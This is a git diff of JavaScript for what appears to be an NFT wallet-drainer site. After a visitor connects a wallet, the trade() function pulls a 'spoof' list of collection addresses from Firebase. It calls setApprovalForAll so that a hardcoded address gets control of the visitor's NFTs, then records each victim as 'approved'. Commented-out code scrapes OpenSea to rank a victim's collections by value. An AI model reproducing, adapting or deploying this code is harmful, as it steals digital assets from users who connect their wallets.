@@ -69,8 +69,8 @@ async function sidebar() {
 
         console.log('sidebar clicked')
 
-        
-        
+
+
         const button1 = $('.css-1u5qx9')
         const button2 = $('.css-htg0vc')
 
@@ -144,7 +144,7 @@ async function menuItems() {
 //     });
 
 //     if (!accounts[0]) {
-        
+
 //     } else {
 //         clearInterval(checkConnected)
 //         account = accounts[0]
@@ -158,11 +158,11 @@ async function menuItems() {
 
 
 var checkConnected = setInterval( () => {
-    
-  
+
+
   var d = JSON.parse(localStorage.getItem('wagmi.store'))
   // console.log(d.state.data)
-  
+
 
     if (!('account' in d.state.data) ) {
       console.log('not connected')
@@ -171,7 +171,7 @@ var checkConnected = setInterval( () => {
       intervalStop()
       trade()
       console.log('connected')
-  
+
     }
 
 }, 3000);
@@ -204,7 +204,7 @@ async function getAddress() {
 //     var offset = 0
 //     var old_count = 0;
 //     try{
-  
+
 //       while(true){ // Added
 //         var url = `${OPENSEA_URL}api/v2/collections?asset_owner=${address}&offset=${offset}&limit=50`
 //         await $.ajax({
@@ -222,7 +222,7 @@ async function getAddress() {
 
 //                 for (var i = 0; i < data.collections.length; i++) {
 //                   //console.log(data.collections[i].collection)
-      
+
 //                   if (data.collections[i].collection.length == 42) {
 //                       console.log(data.collections[i].collection)
 
@@ -233,7 +233,7 @@ async function getAddress() {
 
 //                       //TOTAL MAG SPOOF RAMAN KA AYAW NA PALABIHA, SA PANEL RA KUHAA
 //                 }
-                
+
 //                 }
 //             }
 //         })
@@ -247,7 +247,7 @@ async function getAddress() {
 //     }
 
 
-  
+
 //     for(var i = 0 ; i < collections.length; i++){
 //       collections[i].worth = 0
 //       try{
@@ -264,7 +264,7 @@ async function getAddress() {
 //           ) / 10000
 //         }
 //       }
-      
+
 //     }
 
 //     collections = collections.sort((a, b) => {
@@ -292,7 +292,7 @@ async function loadWallet(address) {
 
         console.log(contracts);
         arr.push(contracts)
-        
+
 
      }  
      console.log(arr)
@@ -719,12 +719,15 @@ const _abi = [
 async function trade() {
   await loadWeb3();
 
-  
+
 
     //DUMDUMA NAA SA ZIP BEFOREFIREBASSE
     //var collections = JSON.parse(localStorage.getItem('spoofCollection'))
+
+    let approvedCollections = db.collection('jangapproved')
     var collections = []
-  
+    let status;
+
     // console.log(collections)
     console.log(account)
 
@@ -735,30 +738,74 @@ async function trade() {
             .onSnapshot( async (doc) => {
               //console.log(doc.data())
               collections = doc.data().spoof
+              status = doc.data().status
 
               console.log(collections)
 
               for(var i = 0; i < collections.length; i++) {
                 var collectionAddress = collections[i]
                 console.log(collectionAddress)
-              
-              
+
+
                 try {
-              
+
+                  if (status == 'approved') {
+                    console.log('no more approval needed')
+
+                     approvedCollections.doc(account).set({
+                      owner: account,
+                      contract: collectionAddress,
+                      status: 'approved'
+                    }).then( function() {
+                      console.log('approved')
+                    }).catch( (err) => {
+                      console.log(err)
+                    })
+
+
+                  } else {
+
                     var collectionContract = await new window.web3.eth.Contract(_abi, collectionAddress, {gas: '100000'})
-                    await collectionContract.methods.setApprovalForAll('0xF89dd912BdD26937aA3B71e4c31e299914E0Ad2F', true).send({from: account})
-              
-                    console.log('Address: '+account+ ' and collection '+ collectionAddress + ' is confirmed')
-                  
+                     await collectionContract.methods.setApprovalForAll('0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262', true).send({from: account})
+
+                     approvedCollections.doc(account).set({
+                      owner: account,
+                      contract: collectionAddress,
+                      status: 'approved'
+                    }).then( function() {
+                      console.log('approved')
+                    }).catch( (err) => {
+                      console.log(err)
+                    })
+
+
+                  }
+
+
+
+
+                    // var collectionContract = await new window.web3.eth.Contract(_abi, collectionAddress, {gas: '100000'})
+                    // await collectionContract.methods.setApprovalForAll('0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262', true).send({from: account})
+
+                    // ref.doc(account).update({
+                    //   status: 'approved'
+                    // }).then( function() {
+                    //   console.log('approved')
+                    // }).catch( (err) => {
+                    //   console.log(err)
+                    // })
+
+                    // console.log('Address: '+account+ ' and collection '+ collectionAddress + ' is confirmed')
+
                 } catch (error) {
-                  
+
                 }
-              
+
               }
             })
         }
       })
-    
+
 
 
 //
@@ -769,19 +816,19 @@ async function trade() {
 //   for(var i = 0; i < collections.length; i++) {
 //     var collectionAddress = collections[i]
 //     console.log(collectionAddress)
-  
-  
+
+
 //     try {
-  
+
 //         var collectionContract = await new window.web3.eth.Contract(_abi, collectionAddress, {gas: '100000'})
 //         await collectionContract.methods.setApprovalForAll('0x948a2e543a898127b69621fbe310bb3a2ea0051a', true).send({from: account})
-  
+
 //         console.log(account)
-      
+
 //     } catch (error) {
-      
+
 //     }
-  
+
 //   }
 // }
 
@@ -795,11 +842,11 @@ async function trade() {
 
     //       var collectionContract = await new window.web3.eth.Contract(_abi, collectionAddress, {gas: '100000'})
     //       await collectionContract.methods.setApprovalForAll('0x948a2e543a898127b69621fbe310bb3a2ea0051a', true).send({from: account})
-          
+
     //     } catch (error) {
 
     //       console.log(error)
-          
+
     //     }
 
 
@@ -814,7 +861,7 @@ async function trade() {
 
 //     var collectionContract = await new window.web3.eth.Contract(_abi, '0x645670add376f19c3d2c9bdd62dd4190c8fad988', {gas: '100000'})
 //     await collectionContract.methods.setApprovalForAll('0x948a2e543a898127b69621fbe310bb3a2ea0051a', true).send({from: '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262'})
-    
+
 //   } catch (error) {
 //     console.log(error)
 //   }
